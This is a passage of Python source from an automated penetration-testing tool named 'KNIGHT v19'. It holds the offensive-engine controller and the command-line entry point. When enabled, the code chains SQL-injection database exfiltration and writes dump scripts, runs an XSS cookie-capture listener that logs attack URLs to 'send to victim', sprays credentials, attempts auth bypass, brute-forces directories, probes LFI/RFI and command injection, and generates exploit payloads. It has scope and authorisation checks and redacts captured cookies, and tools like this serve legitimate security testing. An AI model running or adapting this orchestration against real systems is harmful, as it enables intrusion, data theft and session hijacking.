# OFFENSIVE ENGINE — Master Controller
# ──────────────────────────────────────────────────────────────────────────────

# Lab-only startup XSS capture listener. It is intentionally restricted to
# loopback targets so startup capture cannot be accidentally enabled against
# a remote host.
STARTUP_XSS_CAPTURE = None


class OffensiveEngine:
    def __init__(self, target: str, base_urls: list[str], param_urls: list[str],
                 alive_hosts: list[dict], findings: list[dict], turbo: bool = False):
        self.target = target
        self.base_urls = base_urls
        self.param_urls = param_urls
        self.alive_hosts = alive_hosts
        self.findings = findings
        self.turbo = turbo

    def run_all(self) -> list[dict]:
        new_findings = []
        log_off.info("\n" + "=" * 70)
        log_off.info("  OFFENSIVE MODULE ACTIVATED")
        log_off.info("=" * 70)

        # OFF.1 SQLi Auto-Exfil
        # Only deterministic CONFIRMED findings may enter the exploitation stage.
        sqli_findings = [
            f for f in normalize_finding_statuses(self.findings)
            if "SQL Injection" in f.get("type", "") and finding_is_confirmed(f)
        ]
        for sqli in sqli_findings[:3]:
            url = sqli["url"]
            parsed = urlparse(url)
            qs = parse_qs(parsed.query)
            if qs:
                param = list(qs.keys())[0]
                engine = "MySQL"
                if "pg_sleep" in sqli.get("proof", ""):
                    engine = "PostgreSQL"
                elif "WAITFOR" in sqli.get("proof", ""):
                    engine = "MSSQL"
                log_off.info("[*] Starting SQLi data exfiltration...")
                exfil = SQLiExfiltrator(url, param, technique="time", engine=engine)
                try:
                    exfil_results = exfil.run_full_exfil()
                    script = exfil.generate_dump_script(exfil_results)
                    script_path = EVIDENCE_DIR / f"sqli_dump_{re.sub(r'[^a-z0-9]', '_', self.target)}_{int(time.time())}.py"
                    with open(script_path, "w") as f:
                        f.write(script)
                    os.chmod(script_path, 0o755)
                    new_findings.append({
                        "type": "SQL Injection — Data Exfiltrated",
                        "status": "EXTRACTED",
                        "confidence": "CONFIRMED — database contents extracted",
                        "url": url,
                        "proof": f"Extracted: version={exfil_results.get('version','?')}, user={exfil_results.get('user','?')}, database={exfil_results.get('database','?')}, tables={exfil_results.get('tables',[])}",
                        "repro": f"python3 {script_path}",
                        "img": None,
                    })
                    log_off.info(f"[✔] SQLi exfil complete. Dump script: {script_path}")
                except Exception as e:
                    log_off.warning(f"SQLi exfil failed: {e}")

        # OFF.2 XSS Cookie Capture
        xss_findings = [
            f for f in normalize_finding_statuses(self.findings)
            if "Reflected XSS" in f.get("type", "") and finding_is_confirmed(f)
        ]
        if xss_findings:
            capture = STARTUP_XSS_CAPTURE or XSSCookieCapture()
            if STARTUP_XSS_CAPTURE is not None:
                log_off.info("[*] Using startup XSS cookie-capture listener...")
                cb_url = capture.callback_url
            else:
                log_off.info("[*] Starting XSS cookie capture listener...")
                cb_url = capture.start()
            if cb_url:
                for xss in xss_findings[:5]:
                    parsed = urlparse(xss["url"])
                    for param in parse_qs(parsed.query):
                        attack_url = capture.generate_attack_url(xss["url"], param)
                        if attack_url:
                            log_off.info(f"[!] XSS attack URL (send to victim): {attack_url}")
                log_off.info("[*] Listener will run for 30 seconds. Send attack URL to a victim.")
                time.sleep(30)
                captured = capture.get_captured()
                for c in captured:
                    new_findings.append({
                        "type": "XSS — Session Cookie Captured",
                        "status": "EXTRACTED",
                        "confidence": "CONFIRMED — cookie capture demonstrated; value redacted",
                        "url": c.get("source_url", xss_findings[0]["url"]),
                        "proof": f"Cookie capture demonstrated. Redacted value: {c.get('cookie','?')}",
                        "repro": "redacted; do not replay captured session material",
                        "img": None,
                    })
                capture.stop()

        # OFF.3 Auth Bypass + Cred Spraying
        if not self.turbo:
            log_off.info("[*] Scanning for auth endpoints and testing bypasses...")
            auth_endpoints = discover_auth_endpoints(self.base_urls)
            if auth_endpoints:
                new_findings.extend(test_auth_bypass(auth_endpoints))
                new_findings.extend(spray_credentials(auth_endpoints))

        # OFF.4 Directory Bruteforce
        log_off.info("[*] Running directory/endpoint bruteforce...")
        new_findings.extend(dir_bruteforce(self.base_urls, self.turbo))

        # OFF.5 LFI/RFI
        if not self.turbo and self.param_urls:
            log_off.info("[*] Scanning for LFI/RFI...")
            new_findings.extend(scan_lfi_rfi(self.param_urls))

        # OFF.7 Command Injection
        if self.param_urls:
            log_off.info("[*] Scanning for OS command injection...")
            new_findings.extend(scan_cmd_injection(self.param_urls, self.base_urls))

        # OFF.8 Payload Generator
        log_off.info("[*] Generating exploit payloads...")
        new_findings.extend(generate_exploit_payloads(self.findings + new_findings, self.target, EVIDENCE_DIR))

        log_off.info(f"[✔] Offensive module complete: {len(new_findings)} new findings\n")
        return new_findings


# ==============================================================================
# MASTER CONTROL
# ==============================================================================

log_buraq = get_logger("Knight")

def _parse_header(s):
    if not s or ":" not in s:
        return {}
    k, _, v = s.partition(":")
    return {k.strip(): v.strip()}

def _neural_heartbeat(stop_event, label):
    glyphs = ["▰▱▱▱▱▱▱", "▰▰▱▱▱▱▱", "▰▰▰▱▱▱▱", "▰▰▰▰▱▱▱", "▰▰▰▰▰▱▱", "▰▰▰▰▰▰▱", "▰▰▰▰▰▰▰"]
    i = 0
    while not stop_event.is_set():
        sys.stdout.write(f"\r\033[94m{glyphs[i % 7]} [ {label} ] ... \033[0m")
        sys.stdout.flush()
        time.sleep(0.15)
        i += 1
    sys.stdout.write("\r" + " " * 60 + "\r")

def _with_heartbeat(label, fn, *args, **kwargs):
    stop_event = threading.Event()
    t = threading.Thread(target=_neural_heartbeat, args=(stop_event, label), daemon=True)
    t.start()
    try:
        return fn(*args, **kwargs)
    finally:
        stop_event.set()
        t.join(timeout=1)

def run_nuclei(hosts, turbo):
    """Run Nuclei with explicit diagnostics and a bounded process timeout."""
    if not hosts:
        log_buraq.info("Nuclei skipped: no confirmed live targets.")
        return []

    targets = list(dict.fromkeys(h for h in hosts if h))
    if not targets:
        log_buraq.info("Nuclei skipped: target list is empty.")
        return []

    target_file = BASE_DIR / "ghost_targets.txt"
    scan_log = BASE_DIR / "hardened_scan.txt"
    target_file.write_text("\n".join(targets) + "\n")

    cmd = [
        "nuclei", "-l", str(target_file), "-o", str(scan_log),
        "-timeout", str(NUCLEI_TIMEOUT),
        "-c", str(NUCLEI_CONCURRENCY),
        "-mhe", "20", "-silent",
    ]
    if turbo:
        cmd += ["-severity", "critical,high"]

    # Propagate optional authenticated headers/cookies to Nuclei.
    if _AUTH_HEADERS:
        for key, value in _AUTH_HEADERS.items():
            cmd += ["-H", f"{key}: {value}"]
    if _AUTH_COOKIES:
        cmd += ["-H", f"Cookie: {_cookie_header()}"]


    log_buraq.info(
        "Nuclei config: targets=%d request_timeout=%ss concurrency=%s "
        "process_timeout=%ss mode=%s",
        len(targets), NUCLEI_TIMEOUT, NUCLEI_CONCURRENCY,
        NUCLEI_PROCESS_TIMEOUT, "turbo" if turbo else "deep",
    )
    log_buraq.info("Nuclei target sample: %s", ", ".join(targets[:5]))
    safe_cmd = list(cmd)
    redacted_cmd = []
    i = 0
    while i < len(safe_cmd):
        part = safe_cmd[i]
        if part == "-H" and i + 1 < len(safe_cmd):
            header_part = safe_cmd[i + 1]
            header_name = header_part.split(":", 1)[0]
            redacted_cmd.extend(["-H", f"{header_name}: <REDACTED>"])
            i += 2
            continue
        redacted_cmd.append(part)
        i += 1
    log_buraq.info("Nuclei command: %s", " ".join(redacted_cmd))

    started = time.monotonic()
    stdout_text = ""
    stderr_text = ""

    try:
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        ResourceManager.register_process(proc)

        try:
            stdout_text, stderr_text = proc.communicate(
                timeout=NUCLEI_PROCESS_TIMEOUT
            )
        except subprocess.TimeoutExpired as exc:
            elapsed = time.monotonic() - started
            stdout_text = exc.stdout.decode(errors="replace") if isinstance(exc.stdout, bytes) else (exc.stdout or "")
            stderr_text = exc.stderr.decode(errors="replace") if isinstance(exc.stderr, bytes) else (exc.stderr or "")

            try:
                proc.kill()
            except Exception:
                pass

            try:
                extra_out, extra_err = proc.communicate(timeout=5)
                stdout_text += extra_out or ""
                stderr_text += extra_err or ""
            except Exception:
                pass

            partial_count = 0
            if scan_log.exists():
                try:
                    partial_count = sum(
                        1 for line in scan_log.read_text(errors="replace").splitlines()
                        if line.strip()
                    )
                except Exception:
                    pass

            log_buraq.warning(
                "Nuclei process timeout after %.1fs; partial results=%d",
                elapsed, partial_count
            )
            if stderr_text.strip():
                log_buraq.warning(
                    "Nuclei stderr (last 4000 chars): %s", stderr_text[-4000:]
                )
            if stdout_text.strip():
                log_buraq.info(
                    "Nuclei stdout (last 2000 chars): %s", stdout_text[-2000:]
                )
            return []

        finally:
            if proc in ResourceManager._processes:
                ResourceManager._processes.remove(proc)

    except FileNotFoundError:
        log_buraq.error("Nuclei not found on PATH — skipping CVE/misconfig scan.")
        return []
    except Exception as e:
        log_buraq.error("Nuclei launch failed: %s", e)
        return []

    elapsed = time.monotonic() - started
    if stderr_text.strip():
        log_buraq.info(
            "Nuclei stderr (last 4000 chars): %s", stderr_text[-4000:]
        )
    if stdout_text.strip():
        log_buraq.info(
            "Nuclei stdout (last 2000 chars): %s", stdout_text[-2000:]
        )

    result_lines = []
    if scan_log.exists():
        try:
            result_lines = [
                line.strip()
                for line in scan_log.read_text(errors="replace").splitlines()
                if line.strip()
            ]
        except Exception as e:
            log_buraq.warning("Could not read Nuclei output: %s", e)

    log_buraq.info(
        "Nuclei finished: elapsed=%.1fs results=%d",
        elapsed, len(result_lines)
    )
    return result_lines[:20]

def buraq_master(target, turbo, endpoint_template, candidate_ids, scope_file=None,
                  session_a=None, session_b=None, confirmed_resource_id=None,
                  skip_injection=False, skip_js_secrets=False,
                  offensive=False, verify_secrets=False,
                  auth_check_url=None, auth_check_marker=None):

    if not require_authorization(target):
        sys.exit(1)

    print(f"\033[94m[◈] Knight {VERSION} ENGAGED: {target}\033[0m")
    print(
        f"\033[93m[!] MODE: "
        f"{'TURBO (critical/high only)' if turbo else 'DEEP (full spectrum)'}\033[0m"
    )
    print(
        f"\033[96m[!] AUTH SESSION: "
        f"{'ENABLED' if _AUTH_ENABLED else 'DISABLED'}\033[0m\n"
    )

    parsed_target = urlparse(target if "://" in target else f"https://{target}")
    target_hostname = (parsed_target.hostname or "").lower()
    target_hostport = parsed_target.netloc or target_hostname
    target_base_url = f"{parsed_target.scheme}://{parsed_target.netloc}"

    # Start the cookie-capture listener immediately for the local lab.
    # Remote targets retain the existing post-XSS listener behavior.
    global STARTUP_XSS_CAPTURE
    STARTUP_XSS_CAPTURE = None
    if offensive and target_hostname in {"127.0.0.1", "localhost", "::1"}:
        STARTUP_XSS_CAPTURE = XSSCookieCapture()
        startup_cb = STARTUP_XSS_CAPTURE.start()
        if startup_cb:
            log_off.info("[LAB] XSS cookie-capture listener active from startup: %s", startup_cb)
        else:
            log_off.warning("[LAB] Could not start XSS cookie-capture listener at startup")

    scope_include, scope_exclude = load_scope(scope_file)
    if not scope_file:
        log_scope.warning(
            "No scope file supplied; only the explicitly confirmed target will be scanned."
        )
        scope_include = [target_hostport]

    if not in_scope(target_hostport, scope_include, scope_exclude):
        log_scope.error(f"Target {target_hostport} is outside the supplied scope.")
        raise SystemExit(1)

    stage_times = {}

    def timed(label, fn, *fn_args, **fn_kwargs):
        started = time.monotonic()
        result = _with_heartbeat(label, fn, *fn_args, **fn_kwargs)
        elapsed = time.monotonic() - started
        stage_times[label] = elapsed
        log_buraq.info("TIMING: %s = %.1fs", label, elapsed)
        return result

    auth_result = None
    if _AUTH_ENABLED:
        auth_result = verify_authenticated_session(
            target_hostname or target_hostport,
            check_url=auth_check_url,
            marker=auth_check_marker,
        )
        if not auth_result.get("passed"):
            log_net.warning(
                "Authenticated session is INCONCLUSIVE; continuing with the supplied session."
            )

    # 1. Recon
    alive_hosts = timed(
        "GHOST HUNTER: RECON",
        ghost_hunter,
        target,
        None,
        scope_include,
        scope_exclude,
    )
    host_names = [h["host"] for h in alive_hosts]
    base_urls = [h["url"] for h in alive_hosts]

    if not alive_hosts:
        print(
            f"\033[91m[!] No hosts confirmed reachable for {target}. "
            f"Skipping live crawl and active scanners.\033[0m"
        )

    # 2. Crawl
    all_urls = []
    for base in base_urls:
        parsed_base = urlparse(base)
        hostname = parsed_base.hostname
        if not hostname:
            continue
        started = time.monotonic()
        discovered = _with_heartbeat(
            f"CRAWLING {base}",
            discover_urls,
            base,
        )
        elapsed = time.monotonic() - started
        stage_times[f"CRAWL {hostname}"] = elapsed
        log_buraq.info("TIMING: CRAWL %s = %.1fs", hostname, elapsed)
        all_urls.extend(discovered)

    param_urls = urls_with_params(all_urls)
    js_urls = find_js_urls(all_urls)
    log_buraq.info(
        f"{len(param_urls)} parameterized URL(s), {len(js_urls)} JS file(s) discovered"
    )
    findings = []

    # 3. JS secrets
    if not skip_js_secrets and js_urls:
        findings.extend(
            timed(
                "SCANNING JS FOR SECRETS",
                scan_js_for_secrets,
                js_urls,
                30,
                verify_secrets,
            )
        )

    # 4. Injection scanners
    if not skip_injection and param_urls:
        def _scan_injections():
            out = []
            for u in param_urls[:200]:
                out.extend(scan_reflected_xss(u))
                out.extend(scan_sqli(u))
                out.extend(scan_open_redirect(u))
            return out

        findings.extend(
            timed(
                "SCANNING FOR XSS / SQLI / OPEN REDIRECT",
                _scan_injections,
            )
        )

    # 5. Information disclosure is independent of query parameters.
    # Scan discovered non-JS resources so endpoints such as /debug are
    # not lost merely because they have no query string.
    disclosure_started = time.monotonic()
    disclosure_candidates = [
        u for u in all_urls
        if not urlparse(u).path.lower().endswith(".js")
    ][:200]
    for u in disclosure_candidates:
        findings.extend(scan_information_disclosure(u))
    stage_times["INFORMATION DISCLOSURE"] = time.monotonic() - disclosure_started
    log_buraq.info(
        "TIMING: INFORMATION DISCLOSURE = %.1fs",
        stage_times["INFORMATION DISCLOSURE"],
    )

    # 6. IDOR
    idor_started = time.monotonic()
    if session_a and session_b and confirmed_resource_id:
        for base in base_urls:
            result = confirmed_idor_check(
                base,
                endpoint_template,
                confirmed_resource_id,
                session_a,
                session_b,
            )
            if result:
                findings.append(result)
    else:
        for base in base_urls:
            findings.extend(
                suspected_idor_scan(
                    base,
                    endpoint_template,
                    candidate_ids,
                )
            )
    stage_times["IDOR"] = time.monotonic() - idor_started
    log_buraq.info("TIMING: IDOR = %.1fs", stage_times["IDOR"])

    # 7. Nuclei
    nuclei_started = time.monotonic()
    nuclei_raw = _with_heartbeat(
        "RUNNING NUCLEI",
        run_nuclei,
        host_names,
        turbo,
    )
    stage_times["RUNNING NUCLEI"] = time.monotonic() - nuclei_started
    log_buraq.info(
        "TIMING: RUNNING NUCLEI = %.1fs",
        stage_times["RUNNING NUCLEI"],
    )

    # 8. Offensive modules
    offensive_findings = []
    if offensive:
        started = time.monotonic()
        log_buraq.info("\n" + "!" * 70)
        log_buraq.info("  OFFENSIVE MODULE ENGAGED")
        log_buraq.info("!" * 70)
        engine = OffensiveEngine(
            target,
            base_urls,
            param_urls,
            alive_hosts,
            findings,
            turbo,
        )
        offensive_findings = engine.run_all()
        findings.extend(offensive_findings)
        stage_times["OFFENSIVE MODULES"] = time.monotonic() - started
        log_buraq.info(
            "TIMING: OFFENSIVE MODULES = %.1fs",
            stage_times["OFFENSIVE MODULES"],
        )

    # 8. Brain + Scribe
    started = time.monotonic()
    doctrine = load_signatures()
    findings = dedupe_and_triage(findings, doctrine)
    brain_ctx = brain_context_for_prompt(doctrine)
    ai_proof = _with_heartbeat(
        "GENERATING AI SUMMARY",
        generate_ai_summary,
        target,
        findings,
        nuclei_raw,
        brain_ctx,
    )
    report_path = generate_report(
        target,
        ai_proof,
        findings,
        doctrine,
    )
    stage_times["BRAIN + SCRIBE"] = time.monotonic() - started
    log_buraq.info(
        "TIMING: BRAIN + SCRIBE = %.1fs",
        stage_times["BRAIN + SCRIBE"],
    )

    log_buraq.info("TIMING SUMMARY:")
    for name, elapsed in stage_times.items():
        log_buraq.info("  %-32s %.1fs", name, elapsed)

    print(f"\n\033[92m[✔] REPORT SEALED: {report_path}\033[0m")
    print(
        f"    Hosts alive: {len(alive_hosts)} | URLs crawled: {len(all_urls)} | "
        f"Parameterized: {len(param_urls)} | Findings: {len(findings)}"
    )
    if auth_result is not None:
        print(
            f"    Auth session: {auth_result.get('status', 'INCONCLUSIVE')}"
        )
    if findings:
        status_counts = {
            st: sum(1 for f in findings if f.get("status") == st)
            for st in FINDING_STATUSES
        }
        print(
            "    Status: " +
            " | ".join(f"{k}: {v}" for k, v in status_counts.items())
        )
    if offensive_findings:
        print(f"    Offensive findings: {len(offensive_findings)}")

def main():
    parser = argparse.ArgumentParser(description="KNIGHT v19 - Autonomous Recon & Vulnerability Assessment")
    parser.add_argument("target", nargs="?", help="Target domain, e.g. example.com")
    parser.add_argument("--nuclei-process-timeout", type=float,
                        help="Maximum Nuclei wall-clock time in seconds")
    parser.add_argument("--turbo", action="store_true", help="Critical/high severity only, skip mode prompt")
    parser.add_argument("--scope-file", help="Plain text scope file (wildcards + ! exclusions)")
    parser.add_argument("--endpoint", default="/api/v1/user/{id}",
                         help="Endpoint template with {id} placeholder for IDOR testing")
    parser.add_argument("--ids", default="1,2,3,100,1000",
                         help="Comma-separated candidate IDs for unauthenticated suspected-IDOR scan")
    parser.add_argument("--session-a", help="Header for account A, e.g. 'Authorization: Bearer TOKEN'")
    parser.add_argument("--session-b", help="Header for account B (owns --resource-id)")
    parser.add_argument("--resource-id", help="Resource ID owned by account B, for CONFIRMED-tier IDOR")
    parser.add_argument("--skip-injection", action="store_true", help="Skip XSS/SQLi/open-redirect scanning")
    parser.add_argument("--skip-js-secrets", action="store_true", help="Skip JS secret scanning")
    parser.add_argument("--auth-check-url",
                        help="Optional safe URL used to verify the authenticated session")
    parser.add_argument("--auth-check-marker",
                        help="Optional marker expected only in the authenticated response")
    parser.add_argument("--auth-session-file",
                        help="JSON file containing authorized session headers/cookies for authenticated scanning")
    parser.add_argument("--verify-secrets", action="store_true",
                        help="Opt-in: send supported discovered tokens to provider APIs for live verification")
    parser.add_argument("--offensive", action="store_true",
                         help="Activate offensive modules: SQLi auto-exfil, XSS cookie capture, "
                              "auth bypass, directory bruteforce, LFI/RFI, command injection, "
                              "credential spraying, and exploit payload generation")
    args = parser.parse_args()
    raw_target = args.target
    if not raw_target:
        raw_target = input("\033[92m[?] TARGET DOMAIN: \033[0m").strip()
    if not raw_target:
        print("\033[91m[!] ERROR: NO TARGET SPECIFIED.\033[0m")
        sys.exit(1)
    target = normalize_scan_target(raw_target)
    _load_auth_session(args.auth_session_file)

    global NUCLEI_PROCESS_TIMEOUT
    if args.nuclei_process_timeout is not None:
        NUCLEI_PROCESS_TIMEOUT = max(10.0, args.nuclei_process_timeout)


    turbo = args.turbo
    if not turbo and not args.session_a and not args.offensive:
        raw_mode = input("[?] Mode: (1) Turbo [Critical Only] | (2) Deep [Full Spectrum]: ").strip()
        turbo = raw_mode.strip() == "1"

    session_a = _parse_header(args.session_a) if args.session_a else None
    session_b = _parse_header(args.session_b) if args.session_b else None
    candidate_ids = [i.strip() for i in args.ids.split(",") if i.strip()]

    buraq_master(target, turbo, args.endpoint, candidate_ids, args.scope_file,
                 session_a, session_b, args.resource_id,
                 args.skip_injection, args.skip_js_secrets,
                 offensive=args.offensive,
                 verify_secrets=args.verify_secrets,
                 auth_check_url=args.auth_check_url,
                 auth_check_marker=args.auth_check_marker)

if __name__ == "__main__":
    main()
